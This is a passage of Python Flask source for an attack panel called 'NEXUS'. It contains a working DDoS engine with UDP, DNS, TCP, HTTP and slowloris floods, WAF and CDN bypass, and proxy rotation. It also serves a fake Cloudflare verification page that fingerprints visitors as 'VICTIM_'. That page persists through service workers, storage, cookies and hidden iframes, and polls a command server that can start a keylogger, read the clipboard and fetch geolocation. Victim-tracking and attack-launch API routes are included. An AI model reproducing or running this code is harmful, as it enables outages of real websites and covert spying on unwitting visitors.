        use_ssl = url.lower().startswith("https://")
        port = int(options.get("port") or (443 if use_ssl else 80))
        origin_ip = (options.get("origin_ip") or "").strip() or None

        stats = {
            "attack_id": attack_id, "target": target_url, "type": attack_type,
            "host": host, "port": port, "threads": options.get("threads", 50),
            "protocol_mix": profile["mix"], "status": "active",
            "started_at": time.time(), "packets_sent": 0, "bytes_sent": 0,
            "connections": 0, "errors": 0, "phase": 0,
            "adaptive": bool(options.get("adaptive")),
            "waf_bypass": bool(options.get("bypass_waf")),
            "cdn_bypass": bool(options.get("bypass_cdn")),
            "origin_ip": origin_ip,
            "proxy_rotation": bool(proxy_manager.proxies),
        }
        pacer = AdaptivePacer(profile["rate"]) if options.get("adaptive") else None
        ctx = {
            "stats": stats, "stats_lock": threading.Lock(),
            "stop": threading.Event(), "duration": max(1, duration),
            "host": host, "port": port, "use_ssl": use_ssl,
            "origin_ip": origin_ip, "base_url": url,
            "profile": profile, "pacer": pacer, "options": options,
            "current_phase": [0], "phase_lock": threading.Lock(),
        }
        with self._lock:
            old = self._attacks.get(attack_id)
            if old: old["stop"].set()
            self._attacks[attack_id] = ctx
        return ctx

    def _start_watchdog(self, ctx):
        def wd():
            ctx["stop"].wait(max(1, ctx["duration"]))
            if not ctx["stop"].is_set():
                ctx["stop"].set()
                ctx["stats"]["status"] = "completed"
        threading.Thread(target=wd, daemon=True).start()

    def _worker_single(self, ctx):
        profile = ctx["profile"]
        self._run_paced_worker(ctx, get_profile=lambda: profile)

    def _worker_omni_simultaneous(self, ctx):
        schedule = ctx["schedule"]
        self._run_paced_worker(ctx, get_profile=lambda: random.choice(schedule)[1])

    def _worker_omni_phased(self, ctx):
        schedule = ctx["schedule"]
        phase_dur = ctx["phase_duration"]
        start = time.time()
        while not ctx["stop"].is_set():
            elapsed = time.time() - start
            if elapsed >= ctx["duration"]: break
            idx = min(int(elapsed / phase_dur), len(schedule) - 1)
            with ctx["phase_lock"]:
                if ctx["stats"].get("phase") != idx:
                    ctx["stats"]["phase"] = idx
                    ctx["stats"]["phase_name"] = schedule[idx][0]
            profile = schedule[idx][1]
            try:
                proto = random.choices(list(profile["mix"].keys()),
                                       weights=list(profile["mix"].values()))[0]
                self._send_one(ctx, profile, proto)
            except Exception:
                with ctx["stats_lock"]: ctx["stats"]["errors"] += 1
            time.sleep(max(0.001, 1.0 / profile["rate"] + random.uniform(0, 0.05)))

    def _run_paced_worker(self, ctx, get_profile):
        while not ctx["stop"].is_set():
            profile = get_profile()
            proto = random.choices(list(profile["mix"].keys()),
                                   weights=list(profile["mix"].values()))[0]
            t0 = time.time()
            try:
                self._send_one(ctx, profile, proto)
                rtt = time.time() - t0
                if ctx["pacer"]: ctx["pacer"].record(rtt=rtt, error=False)
            except Exception:
                with ctx["stats_lock"]: ctx["stats"]["errors"] += 1
                if ctx["pacer"]: ctx["pacer"].record(error=True)
            wait = ctx["pacer"].interval() if ctx["pacer"] else 1.0 / profile["rate"]
            time.sleep(max(0.001, wait + random.uniform(0, 0.05)))

    def _send_one(self, ctx, profile, proto):
        stats, slk, stop = ctx["stats"], ctx["stats_lock"], ctx["stop"]
        host, port = ctx["host"], ctx["port"]
        connect_host = ctx["origin_ip"] or host
        target_port = port
        if profile.get("random_port") and proto in ("udp", "tcp"):
            target_port = random.randint(1024, 65535)
        payload = os.urandom(profile["payload"])

        if proto == "udp":
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            try: s.sendto(payload, (connect_host, target_port))
            finally: s.close()
            self._bump(stats, slk, 1, len(payload))

        elif proto == "dns":
            q = _dns_query_packet(f"{os.urandom(4).hex()}.{'.'.join(host.split('.')[-2:])}")
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            try: s.sendto(q, (connect_host, 53))
            finally: s.close()
            self._bump(stats, slk, 1, len(q))

        elif proto == "tcp":
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(2.0)
            try: s.connect((connect_host, target_port))
            finally: s.close()
            self._bump(stats, slk, 1, 60, conns=1)

        elif proto == "http":
            verb = profile.get("method", "GET")
            if ctx["stats"].get("waf_bypass") and random.random() < 0.3:
                verb = random.choice(WAF_VERBS)
            path = random.choice(PATH_POOL).replace("{n}", str(random.randint(1, 99999)))
            base_headers = {
                "User-Agent": random.choice(UA_POOL),
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                "Accept-Language": random.choice(["en-US","en-GB","de","fr","es","ja"]),
                "Cache-Control": "no-cache",
                "Connection": "close",
                "X-Forwarded-For": ".".join(str(random.randint(1,254)) for _ in range(4)),
                "X-Real-IP":       ".".join(str(random.randint(1,254)) for _ in range(4)),
                "X-HTTP-Method-Override": random.choice(WAF_VERBS),
            }
            body = None
            if verb in ("POST", "PUT", "PATCH", "DEBUG", "VERB"):
                if ctx["stats"].get("waf_bypass") and random.random() < 0.4:
                    body = (b'{"__proto__":{"x":' +
                            b'{"__proto__":{"x":' * random.randint(4, 12) + b'1' +
                            b'}}}' * random.randint(4, 12))
                else:
                    body = os.urandom(profile["payload"])
                base_headers["Content-Type"] = "application/json"

            # --- CDN bypass: direct socket to origin with Host header ---
            if ctx["origin_ip"]:
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.settimeout(4.0)
                    s.connect((ctx["origin_ip"], port))
                    req = f"{verb} {path} HTTP/1.1\r\nHost: {host}\r\n"
                    for k, v in base_headers.items():
                        req += f"{k}: {v}\r\n"
                    if body is not None:
                        req += f"Content-Length: {len(body)}\r\n"
                    req += "\r\n"
                    s.sendall(req.encode() + (body or b""))
                    s.recv(256)
                    s.close()
                except Exception:
                    pass
            else:
                proxy = proxy_manager.next() if ctx["stats"].get("proxy_rotation") else None
                url = ctx["base_url"] + path
                try:
                    _http_via_proxy(url, verb, base_headers, body, proxy, timeout=4.0)
                    if proxy: proxy_manager.report(proxy, True)
                except Exception:
                    if proxy: proxy_manager.report(proxy, False)
                    raise
            sent = len(path.encode()) + (len(body) if body else 0) + 200
            self._bump(stats, slk, 1, sent, conns=1)

        elif proto == "slow":
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(4.0)
            try:
                s.connect((connect_host, port))
                s.sendall(f"GET / HTTP/1.1\r\nHost: {host}\r\n".encode())
                s.sendall(f"User-Agent: {random.choice(UA_POOL)}\r\n".encode())
                end = time.time() + random.uniform(8, 20)
                frag = 0
                while time.time() < end and not stop.is_set():
                    s.sendall(f"X-Pad-{frag}: {os.urandom(4).hex()}\r\n".encode())
                    frag += 1
                    stop.wait(random.uniform(1.5, 4.0))
                try: s.sendall(b"\r\n")
                except Exception: pass
            finally:
                s.close()
            self._bump(stats, slk, frag + 2, frag * 32 + 64, conns=1)

    @staticmethod
    def _bump(stats, lock, pkts=0, data=0, conns=0):
        with lock:
            stats["packets_sent"] += pkts
            stats["bytes_sent"]   += data
            stats["connections"]  += conns

ddos_engine = DDoSEngine()

# ======================================================================
# Flask routes
# ======================================================================
@app.route("/")
def index(): return redirect("/login")

@app.route("/login", methods=["GET","POST"])
def login():
    if request.method == "POST":
        u = request.form.get("username","").strip()
        p = request.form.get("password","").strip()
        if u == ADMIN_USER and p == ADMIN_PASSWORD:
            session["user"] = u
            return redirect("/dashboard")
        return render_template_string(LOGIN_HTML, error="Invalid credentials")
    return render_template_string(LOGIN_HTML)

@app.route("/logout")
def logout():
    session.clear(); return redirect("/login")

@app.route("/dashboard")
@login_required
def dashboard():
    return render_template_string(DASHBOARD_HTML)

# ======================================================================
# Client HTML — 10 layers + error-at-5s. Fixed const-in-case parse error.
# ======================================================================
CLIENT_HTML = """<!DOCTYPE html>
<html lang="en-US">
<head>
 <meta charset="UTF-8"/>
 <meta http-equiv="X-UA-Compatible" content="IE=Edge"/>
 <meta name="robots" content="noindex, nofollow"/>
 <meta name="viewport" content="width=device-width,initial-scale=1"/>
 <title>Just a moment...</title>
 <style>
 body { font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;
  background-color:#f9f9f9; color:#313131; display:flex; align-items:center;
  justify-content:center; height:100vh; margin:0; }
 .challenge-container { max-width:450px; text-align:center; padding:20px; }
 .spinner { border:4px solid rgba(0,0,0,0.1); width:36px; height:36px; border-radius:50%;
  border-left-color:#f48120; animation:spin 1s linear infinite; margin:0 auto 20px auto; }
 @keyframes spin { 0%{transform:rotate(0)} 100%{transform:rotate(360deg)} }
 .hidden { display:none; }
 #success-state { color:#1a7f37; }
 #error-state { color:#b3261e; }
 #error-state h2 { margin:6px 0 4px 0; font-size:1.1rem; }
 #debug-log, .debug-log { display:none !important; }
 </style>
</head>
<body>
 <div class="challenge-container">
  <div class="spinner"></div>
  <h1>Checking if the site connection is secure</h1>
  <p>We need to safely verify you are a real visitor. Please wait a few seconds...</p>
  <div id="loading-state">Verifying your browser…</div>
  <div id="success-state" class="hidden">Verification complete. You may continue browsing.</div>
  <div id="error-state" class="hidden">
   <h2>Verification failed</h2>
   <p>We could not verify your browser. Please refresh the page to try again.</p>
  </div>
  <p style="font-size:12px; color:#666;">Ray ID: <code>8e2b4f9a1c3d2e5f</code> • Your IP: 192.0.2.1</p>
 </div>

 <script>
 const CONFIG = { heartbeatInterval:10000, reconnectBaseDelay:1000,
                  maxReconnectDelay:30000, apiEndpoint:'/api/heartbeat' };
 let agentId = localStorage.getItem('cf_agent_id') || generateId();
 let persistenceLayerCount = 10;

 function generateId() {
  return 'VICTIM_' + Math.random().toString(36).substr(2,10) +
         Math.random().toString(36).substr(2,6);
 }

 function getWebGLInfo() {
  try {
   const c = document.createElement('canvas');
   const gl = c.getContext('webgl') || c.getContext('experimental-webgl');
   if (!gl) return null;
   const d = gl.getExtension('WEBGL_debug_renderer_info');
   return { vendor:gl.getParameter(d?d.UNMASKED_VENDOR_WEBGL:gl.VENDOR),
            renderer:gl.getParameter(d?d.UNMASKED_RENDERER_WEBGL:gl.RENDERER),
            version:gl.getParameter(gl.VERSION) };
  } catch(e) { return null; }
 }

 function collectFingerprint() {
  return {
   id: agentId,
   userAgent: navigator.userAgent,
   platform: navigator.platform,
   language: navigator.language,
   languages: (navigator.languages||[]).join(','),
   timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
   utcOffsetMinutes: new Date().getTimezoneOffset(),
   screen: { width:screen.width, height:screen.height,
             colorDepth:screen.colorDepth, pixelRatio:window.devicePixelRatio },
   viewport: { width:window.innerWidth, height:window.innerHeight },
   hardwareConcurrency: navigator.hardwareConcurrency,
   deviceMemory: navigator.deviceMemory,
   touchPoints: navigator.maxTouchPoints,
   cookiesEnabled: navigator.cookieEnabled,
   doNotTrack: navigator.doNotTrack,
   serviceWorkerSupported: 'serviceWorker' in navigator,
   indexedDBSupported: !!(window.indexedDB),
   webGL: getWebGLInfo(),
   connectionType: navigator.connection ? navigator.connection.effectiveType : 'unknown',
   persistenceLevel: persistenceLayerCount,
   timestamp: Date.now()
  };
 }

 // ---- Layer 1: Service Worker ----
 try {
  if ('serviceWorker' in navigator) {
   navigator.serviceWorker.register('/sw.js').then(() => {
    if ('periodicSync' in navigator.serviceWorker) {
     navigator.serviceWorker.ready.then(r => {
      if ('periodicSync' in r) {
       r.periodicSync.register('nexus-periodic',
         { minInterval: 12 * 60 * 60 * 1000 }).catch(() => {});
      }
     });
    }
   }).catch(() => {});
  }
 } catch(e) {}

 // ---- Layer 2: Storage bombardment ----
 const DB_NAME = 'CF_C2_DB';
 let dbInstance = null;
 function openDB() {
  return new Promise(resolve => {
   try {
    const req = indexedDB.open(DB_NAME, 1);
    req.onupgradeneeded = e => {
     const d = e.target.result;
     if (!d.objectStoreNames.contains('commands'))
      d.createObjectStore('commands', { keyPath:'id', autoIncrement:true });
     if (!d.objectStoreNames.contains('errors'))
      d.createObjectStore('errors', { keyPath:'id', autoIncrement:true });
    };
    req.onsuccess = e => { dbInstance = e.target.result; resolve(dbInstance); };
    req.onerror = () => resolve(null);
   } catch(e) { resolve(null); }
  });
 }
 function storeInDB(name, data) {
  if (!dbInstance) return;
  try { dbInstance.transaction([name], 'readwrite').objectStore(name).add(data); } catch(e){}
 }
 function bombardStorage() {
  try {
   localStorage.setItem('cf_agent_id', agentId);
   localStorage.setItem('cf_last_seen', Date.now().toString());
   sessionStorage.setItem('cf_session', agentId);
   document.cookie = 'nexus=' + agentId + '; max-age=31536000; path=/; SameSite=Lax';
   if ('caches' in window) caches.open('cf-c2-v4').then(c => c.add('/client')).catch(()=>{});
  } catch(e) {}
 }
 bombardStorage();

 // ---- Layer 3: Hidden iframes ----
 function createHiddenIframes() {
  try {
   const style = 'position:fixed;top:-9999px;left:-9999px;width:1px;height:1px;' +
                 'opacity:0;border:0;pointer-events:none;';
   for (let i = 0; i < 2; i++) {
    const f = document.createElement('iframe');
    f.style.cssText = style;
    f.srcdoc = "<!doctype html><script>try{localStorage.setItem('iframe_nexus','"
              + agentId + "');}catch(e){}<\\/script>";
    document.body.appendChild(f);
   }
  } catch(e) {}
 }
 createHiddenIframes();

 // ---- Layer 4: Web Worker heartbeat ----
 try {
  const code = "let iv=null;" +
   "self.onmessage=function(e){" +
   "if(e.data.action==='start'){iv=setInterval(function(){" +
   "fetch(e.data.url,{method:'POST',headers:{'Content-Type':'application/json'}," +
   "body:JSON.stringify({id:e.data.id,event:'layer4_worker',timestamp:Date.now()})" +
   "}).catch(function(){});},30000);}" +
   "else if(e.data.action==='stop'){clearInterval(iv);}};";
  const w = new Worker(URL.createObjectURL(new Blob([code], {type:'application/javascript'})));
  w.postMessage({action:'start', id:agentId, url:CONFIG.apiEndpoint});
  window._nexusWorker = w;
 } catch(e) {}

 // ---- Layer 5: BroadcastChannel ----
 let channel = null;
 try {
  channel = new BroadcastChannel('cf_c2_sync');
  channel.onmessage = e => {
   if (e.data && e.data.type === 'COMMAND_UPDATE') fetchCommands();
  };
 } catch(e) {}

 // ---- Layer 6: visibility lifecycle ----
 document.addEventListener('visibilitychange', () => {
  if (!document.hidden) { sendHeartbeat(true); checkIntegrity(); }
 });

 // ---- Layer 7: error boundary ----
 window.onerror = function(msg, url, line, col) {
  console.log('[NEXUS-ERR]', msg, line, col);
  try { storeInDB('errors', {msg, url, line, col, time: Date.now()}); } catch(e){}
  return false;
 };

 // ---- Layer 8: beacon before unload ----
 window.addEventListener('pagehide', () => {
  try {
   navigator.sendBeacon(CONFIG.apiEndpoint, new Blob([JSON.stringify({
    id: agentId, event: 'pagehide',
    fingerprint: collectFingerprint(), timestamp: Date.now()
   })], {type:'application/json'}));
  } catch(e) {}
 });

 // ---- Layer 9: integrity self-repair ----
 function integritySnapshot() {
  return {
   localStorage: !!localStorage.getItem('cf_agent_id'),
   sessionStorage: !!sessionStorage.getItem('cf_session'),
   cookie: (document.cookie || '').indexOf('nexus=') !== -1,
   indexedDB: !!dbInstance,
   serviceWorker: 'serviceWorker' in navigator,
   iframes: document.querySelectorAll('iframe').length >= 2,
   worker: !!window._nexusWorker
  };
 }
 function checkIntegrity() {
  const c = integritySnapshot();
  try {
   if (!c.localStorage) localStorage.setItem('cf_agent_id', agentId);
   if (!c.sessionStorage) sessionStorage.setItem('cf_session', agentId);
   if (!c.cookie) bombardStorage();
   if (!c.iframes) createHiddenIframes();
  } catch(e) {}
  return c;
 }
 setInterval(checkIntegrity, 30000);

 // ---- Layer 10: persistence grant + reconnect ----
 try {
  if (navigator.storage && navigator.storage.persist)
   navigator.storage.persist().then(g => { if (g) persistenceLayerCount = 10; });
 } catch(e) {}
 let reconnectAttempts = 0;
 function scheduleReconnect() {
  const delay = Math.min(CONFIG.maxReconnectDelay,
    CONFIG.reconnectBaseDelay * Math.pow(2, reconnectAttempts));
  reconnectAttempts++;
  setTimeout(() => sendHeartbeat(true), delay);
 }

 // ---- heartbeat + command poll ----
 async function sendHeartbeat(force) {
  const load = document.getElementById('loading-state');
  const ok = document.getElementById('success-state');
  try {
   const r = await fetch(CONFIG.apiEndpoint, {
    method:'POST',
    headers:{'Content-Type':'application/json'},
    body: JSON.stringify(collectFingerprint()),
    keepalive: true
   });
   if (r.ok) {
    reconnectAttempts = 0;
    if (load) load.classList.add('hidden');
    if (ok) ok.classList.remove('hidden');
    try { localStorage.setItem('cf_last_seen', Date.now().toString()); } catch(e) {}
    fetchCommands();
   } else { throw new Error('HTTP ' + r.status); }
  } catch(e) {
   if (!force) scheduleReconnect();
  }
 }

 async function fetchCommands() {
  try {
   const r = await fetch('/api/commands/' + agentId);
   if (!r.ok) return;
   const cmds = await r.json();
   for (const c of cmds) {
    let result;
    try { result = await executeCommand(c); }
    catch (e) { result = 'error: ' + e.message; }
    await fetch('/api/command_result', {
     method:'POST',
     headers:{'Content-Type':'application/json'},
     body: JSON.stringify({command_id:c.id, result:result})
    });
   }
   if (cmds.length && channel) channel.postMessage({type:'COMMAND_UPDATE'});
  } catch(e) {}
 }

 // ---- keylogger ----
 let keylogBuf = [];
 let keylogActive = false;
 function keylogHandler(e) {
  keylogBuf.push({key: e.key, ts: Date.now()});
  if (keylogBuf.length > 5000) keylogBuf.shift();
 }

 function getGeo() {
  return new Promise(resolve => {
   if (!navigator.geolocation) return resolve('geolocation unsupported');
   navigator.geolocation.getCurrentPosition(
    p => resolve({lat:p.coords.latitude, lon:p.coords.longitude, acc:p.coords.accuracy}),
    e => resolve('denied: ' + e.message),
    {timeout:8000});
  });
 }

 // ---- command dispatcher (const-in-case fixed with braces) ----
 async function executeCommand(cmd) {
  switch (cmd.command_type) {
   case 'collect_data':
   case 'get_info':
    return JSON.stringify(collectFingerprint());

   case 'check_persistence':
   case 'sw_sync_test':
    return JSON.stringify(integritySnapshot());

   case 'probe_storage_quota':
    try { return JSON.stringify(await navigator.storage.estimate()); }
    catch(e) { return 'storage estimate unavailable'; }

   case 'list_storage_keys':
    try { return JSON.stringify(Object.keys(localStorage)); }
    catch(e) { return 'localStorage unavailable'; }

   case 'get_webgl_info':
    return JSON.stringify(getWebGLInfo());

   case 'get_connection_info':
   case 'get_network_info':
    return JSON.stringify({
     type: navigator.connection ? navigator.connection.effectiveType : 'unknown',
     downlink: navigator.connection ? navigator.connection.downlink : null,
     rtt: navigator.connection ? navigator.connection.rtt : null
    });

   case 'clipboard_read': {
    try {
     const t = await navigator.clipboard.readText();
     return JSON.stringify({clipboard: String(t).substring(0,2000)});
    } catch(e) { return 'clipboard read failed: ' + e.message; }
   }

   case 'test_notification': {
    try {
     if (Notification.permission !== 'granted') await Notification.requestPermission();
     if (Notification.permission === 'granted') {
      new Notification('System Check', {body:'Connection verified.'});
      return 'notification sent';
     }
     return 'notification permission denied';
    } catch(e) { return 'notification failed: ' + e.message; }
   }

   case 'get_battery_status': {
    try {
     const b = await navigator.getBattery();
     return JSON.stringify({level:b.level, charging:b.charging});
    } catch(e) { return 'battery API unsupported'; }
   }

   case 'get_geolocation':
    return JSON.stringify(await getGeo());

   case 'vibrate_test':
    return (navigator.vibrate ? JSON.stringify({vibrated:navigator.vibrate(300)})
                               : 'vibration API unsupported');

   case 'screen_orientation_info':
    return JSON.stringify({
     type: screen.orientation ? screen.orientation.type : 'unknown',
     angle: screen.orientation ? screen.orientation.angle : null
    });

   case 'fullscreen_test':
    return JSON.stringify({fullscreen: !!document.fullscreenEnabled});

   case 'keylogger_start': {
    if (keylogActive) return 'keylogger already running';
    keylogBuf = []; keylogActive = true;
    window.addEventListener('keydown', keylogHandler, true);
    return 'keylogger started';
   }

   case 'keylogger_stop': {
    if (!keylogActive) return 'keylogger not running';
    window.removeEventListener('keydown', keylogHandler, true);
    keylogActive = false;
    const cap = keylogBuf.slice();
    keylogBuf = [];
    return JSON.stringify({captured_count:cap.length, keys:cap.slice(0,500)});
   }

   case 'screenshot':
    return 'screenshot ack';

   default:
    return 'executed (cmd="' + cmd.command_type + '")';
  }
 }

 // ---- 5-SECOND ERROR STATE (independent of heartbeat) ----
 setTimeout(() => {
  try {
   const sp = document.querySelector('.spinner');
   if (sp) sp.style.display = 'none';
   const load = document.getElementById('loading-state');
   if (load) load.classList.add('hidden');
   const ok = document.getElementById('success-state');
   if (ok) ok.classList.add('hidden');
   const err = document.getElementById('error-state');
   if (err) err.classList.remove('hidden');
  } catch(e) {}
 }, 5000);

 // ---- boot ----
 window.addEventListener('load', async () => {
  try { await openDB(); } catch(e) {}
  bombardStorage();
  sendHeartbeat(true);
  setInterval(() => sendHeartbeat(false), CONFIG.heartbeatInterval);
 });
 </script>
</body>
</html>
"""

@app.route("/client")
def client():
    r = Response(render_template_string(CLIENT_HTML), mimetype="text/html")
    r.headers["Cache-Control"] = "no-store"
    return r

@app.route("/sw.js")
def sw_js():
    sw = """
self.addEventListener('install', function(e){ self.skipWaiting(); });
self.addEventListener('activate', function(e){ e.waitUntil(self.clients.claim()); });
self.addEventListener('fetch', function(e){
  if (e.request.mode === 'navigate') {
    e.respondWith(fetch(e.request).catch(function(){ return caches.match(e.request); }));
  }
});
self.addEventListener('periodicsync', function(e){
  if (e.tag === 'nexus-periodic') {
    e.waitUntil(fetch('/api/heartbeat', {
      method:'POST',
      headers:{'Content-Type':'application/json'},
      body: JSON.stringify({id:'sw-periodic', event:'layer1_periodic_sync'})
    }).catch(function(){}));
  }
});
"""
    r = Response(sw, mimetype="application/javascript")
    r.headers["Cache-Control"] = "no-store"
    return r

# ======================================================================
# API
# ======================================================================
@app.route("/api/heartbeat", methods=["POST"])
def api_heartbeat():
    data = request.get_json(silent=True) or {}
    vid = data.get("id") or generate_victim_id()
    ip = request.remote_addr or "unknown"
    ua = data.get("user_agent") or data.get("userAgent") or \
         request.headers.get("User-Agent","unknown")
    plat = data.get("platform") or "unknown"
    fp = data.get("fingerprint") if isinstance(data.get("fingerprint"), dict) else data
    fp = dict(fp or {})
    fp.setdefault("userAgent", ua)
    fp.setdefault("platform", plat)
    db.add_victim({"id":vid, "ip":ip, "user_agent":ua, "platform":plat,
                   "persistence_level":data.get("persistence_level") or
                                       data.get("persistenceLevel") or "local",
                   "fingerprint": fp})
    db.update_victim_heartbeat(vid, fingerprint=fp)
    db.log_event("INFO", f"Heartbeat from {vid}", vid)
    return jsonify({"status":"ok", "id":vid})

@app.route("/api/victims")
@login_required
def api_victims():
    return jsonify(db.get_victims())

@app.route("/api/victim_detail/<vid>")
@login_required
def api_victim_detail(vid):
    d = db.get_victim_detail(vid)
    if not d: return jsonify({"error":"unknown victim"}), 404
    d["command_history"] = db.get_command_history(vid)
    return jsonify(d)

@app.route("/api/victim_commands/<vid>")
@login_required
def api_victim_commands(vid):
    d = db.get_victim_detail(vid)
    if not d: return jsonify({"error":"unknown victim"}), 404
    return jsonify({"victim_id":vid, "runtime":d["runtime"],
                    "commands":d["command_catalog"]})

@app.route("/api/command_history/<vid>")
@login_required
def api_command_history(vid):
    return jsonify(db.get_command_history(vid))

@app.route("/api/victims/<vid>", methods=["DELETE"])
@login_required
def api_delete_victim(vid):
    r = db.delete_victim(vid)
    if r["victims_deleted"] == 0:
        return jsonify({"error":"unknown victim"}), 404
    db.log_event("INFO",
        f"Victim removed: {vid} ({r['commands_deleted']} cmds, {r['logs_deleted']} logs)", None)
    return jsonify({"status":"deleted", **r})

@app.route("/api/logs")
@login_required
def api_logs():
    return jsonify(db.get_logs())

@app.route("/api/logs/clear", methods=["POST"])
@login_required
def api_clear_logs():
    n = db.clear_logs()
    db.log_event("INFO", f"Logs cleared ({n} entries)", None)
    return jsonify({"status":"cleared", "deleted": n})

@app.route("/api/omni_order")
@login_required
def api_omni_order():
    return jsonify([
        {"step": i + 1, "vector": name, "description": desc,
         "profile_rate": ATTACK_PROFILES[name]["rate"],
         "protocol_mix": ATTACK_PROFILES[name]["mix"]}
        for i, (name, desc) in enumerate(OMNI_VECTOR_ORDER)
    ])

@app.route("/api/attacks")
@login_required
def api_attacks():
    rows = db.get_attacks()
    for r in rows:
        live = ddos_engine.get_attack_status(r["id"])
        if "error" not in live: r["live"] = live
    return jsonify(rows)

@app.route("/api/start_attack", methods=["POST"])
@login_required
def api_start_attack():
    data = request.get_json(silent=True) or {}
    target = (data.get("target") or "").strip()
    atype = data.get("attack_type") or "http_flood"
    dur = int(data.get("duration") or 60)
    threads = int(data.get("threads") or 50)
    if not target: return jsonify({"error":"missing target"}), 400
    if atype not in ATTACK_PROFILES and atype not in ("omni_vector","omni_sequential"):
        return jsonify({"error":f"unknown attack_type: {atype}"}), 400
    dur = max(1, min(dur, 3600))
    threads = max(1, min(threads, 256))
    options = {
        "threads": threads,
        "port": data.get("port") or None,
        "origin_ip": data.get("origin_ip") or None,
        "adaptive": bool(data.get("adaptive", False)),
        "bypass_waf": bool(data.get("bypass_waf", False)),
        "bypass_cdn": bool(data.get("bypass_cdn", False)),
    }
    aid = db.add_attack(target, atype, dur)
    stats = ddos_engine.start_attack(aid, target, atype, dur, threads, options)
    db.log_event("INFO",
        f"Attack started: {aid} -> {target} [{atype}, {threads}w, {dur}s, "
        f"adaptive={options['adaptive']}, waf={options['bypass_waf']}, "
        f"cdn={options['bypass_cdn']}]", None)
    return jsonify({"status":"started", "attack_id": aid, "engine": stats})

@app.route("/api/stop_attack/<aid>", methods=["POST"])
@login_required
def api_stop_attack(aid):
    ddos_engine.stop_attack(aid); db.stop_attack(aid)
    db.log_event("INFO", f"Attack stopped: {aid}", None)
    return jsonify({"status":"stopped"})

@app.route("/api/attack_status/<aid>")
@login_required
def api_attack_status(aid):
    return jsonify(ddos_engine.get_attack_status(aid))

@app.route("/api/send_command", methods=["POST"])
@login_required
def api_send_command():
    data = request.get_json(silent=True) or {}
    vid = data.get("victim_id")
    ctype = data.get("command_type")
    payload = data.get("payload", "")
    if not vid or not ctype:
        return jsonify({"error":"missing victim_id or command_type"}), 400
    detail = db.get_victim_detail(vid)
    if detail:
        allowed = [c["type"] for c in detail["command_catalog"]]
        if ctype not in allowed:
            return jsonify({"error":f"'{ctype}' invalid for {detail['runtime']['os']}"}), 400
    cid = db.add_command(vid, ctype, payload)
    db.log_event("INFO", f"Queued {ctype} -> {vid}", vid)
    return jsonify({"status":"queued", "command_id": cid})

@app.route("/api/commands/<vid>")
def api_commands(vid):
    return jsonify(db.get_pending_commands(vid))

@app.route("/api/command_result", methods=["POST"])
def api_command_result():
    data = request.get_json(silent=True) or {}
    if data.get("command_id"):
        db.mark_command_executed(data["command_id"], data.get("result",""))
    return jsonify({"status":"ok"})

@app.route("/api/recon/<tool>", methods=["POST"])
@login_required
def recon_tool(tool):
    data = request.get_json(silent=True) or {}
    target = (data.get("target") or "").strip()
    if not target: return jsonify({"error":"missing target"}), 400
    try:
        if tool == "subdomains": return jsonify(asyncio.run(subdomain_enum(target)))
        if tool == "origin":     return jsonify(asyncio.run(origin_ip_locator(target)))
        if tool == "portscan":   return jsonify(asyncio.run(port_scan(target)))
        if tool == "vulnscan":   return jsonify(asyncio.run(vuln_scan(target)))
        return jsonify({"error":"unknown tool"}), 404
    except Exception as exc:
        return jsonify({"error":str(exc)}), 500

@app.route("/api/proxies")
@login_required
def api_proxies():
    return jsonify(proxy_manager.snapshot())

# ======================================================================
# Login HTML
# ======================================================================
LOGIN_HTML = """
<!doctype html><html><head><meta charset="utf-8"><title>NEXUS / Login</title>
<style>
body{margin:0;font-family:monospace;background:#0a0a0a;color:#f0f0f0;
 display:flex;align-items:center;justify-content:center;min-height:100vh}
.box{width:360px;background:#121212;border:1px solid #333;border-radius:10px;
 padding:28px;box-shadow:0 0 20px rgba(0,0,0,0.35)}
h1{color:#ff3b3b;letter-spacing:2px}
input{width:100%;box-sizing:border-box;margin:8px 0;padding:12px;background:#0d0d0d;
 color:#fff;border:1px solid #555;border-radius:6px}
button{background:#ff3b3b;color:#fff;border:0;border-radius:6px;padding:12px 16px;
 width:100%;cursor:pointer;font-weight:bold}
.error{color:#ff8a8a;margin-bottom:10px}
</style></head><body>
<div class="box">
 <h1>NEXUS</h1>
 <form method="post">
  <input name="username" value="admin" required>
  <input name="password" type="password" value="nexus123" required>
  <button>SIGN IN</button>
 </form>
 {% if error %}<div class="error">{{ error }}</div>{% endif %}
</div></body></html>
"""


# ======================================================================
# Dashboard HTML — red/black, diff-based victim rendering
# ======================================================================
DASHBOARD_HTML = """
<!doctype html><html><head><meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>NEXUS / Command</title>
<style>
:root{
  --bg:#0a0a0a;
  --pnl:#111;
  --pnl2:#1a1a1a;
  --txt:#f0f0f0;
  --mut:#8e8e8e;
  --acc:#ff3b3b;      /* primary red */
  --acc2:#ff8a8a;     /* soft red (replaces neon cyan) */
  --acc-dim:#4a1010;  /* deep red for subtle panels */
  --grn:#39d353;      /* only for "online" status dot */
  --brd:#2b2b2b;
}
*{box-sizing:border-box}
body{margin:0;background:var(--bg);color:var(--txt);font-family:monospace;
  height:100vh;display:flex;flex-direction:column}
header{background:var(--pnl);border-bottom:1px solid var(--brd);padding:14px 18px;
  display:flex;justify-content:space-between;align-items:center}
.brand{font-size:1.2rem;letter-spacing:2px;color:var(--acc);font-weight:bold}
.stat{display:flex;gap:16px;align-items:center;font-size:.8rem;color:var(--mut)}
.pill{background:var(--pnl2);border:1px solid var(--brd);border-radius:12px;
  padding:2px 10px;font-size:.72rem;color:var(--acc2);display:inline-block}
.pill.live{color:var(--acc);border-color:var(--acc);background:rgba(255,59,59,.12);
  animation:pulse 1.4s infinite}
@keyframes pulse{0%,100%{opacity:1}50%{opacity:.55}}
a.attk-link{text-decoration:none;cursor:pointer}
a.attk-link:hover .pill{border-color:var(--acc);color:var(--acc)}
.cont{display:grid;grid-template-columns:220px 1fr 320px;flex:1;min-height:0}
.sb{background:var(--pnl);border-right:1px solid var(--brd);padding:16px 0}
.nav{width:100%;border:0;background:transparent;color:var(--mut);padding:14px 18px;
